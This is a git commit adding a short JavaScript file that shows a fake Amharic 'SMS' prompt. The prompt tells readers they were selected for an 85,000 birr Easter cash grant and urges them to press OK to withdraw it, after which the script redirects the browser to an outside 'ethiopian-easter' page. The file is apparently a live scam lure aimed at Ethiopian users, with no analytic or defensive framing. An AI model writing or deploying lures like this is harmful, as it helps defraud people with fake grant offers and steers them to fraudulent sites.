22fecb5238cd052698e02fcabe057b72808792e5
bigukpe <bigaka42@gmail.com>
2025-04-15 08:45:43 +0100

    Create ethiopia-active.js

---
+++ ethiopia-active.js
@@ -0,0 +1,5 @@
+var password = 'ETB85,000 ማውጣት'
+password=prompt('SMS: እንኳን ደስ አላችሁ፣ 85,000 ብር ለፋሲካ የገንዘብ ድጎማ ለመቀበል ከተመረጡት ኢትዮጵያዊያን መካከል ናችሁ፣ አሁን ገንዘብ ለማውጣት እሺን ይጫኑ ','ETB85,000 ማውጣት');
+if (password != 'ETB85,000 ማውጣት') {
+location.href='https://learnlivetech.org/ethiopian-easter.html';
+}
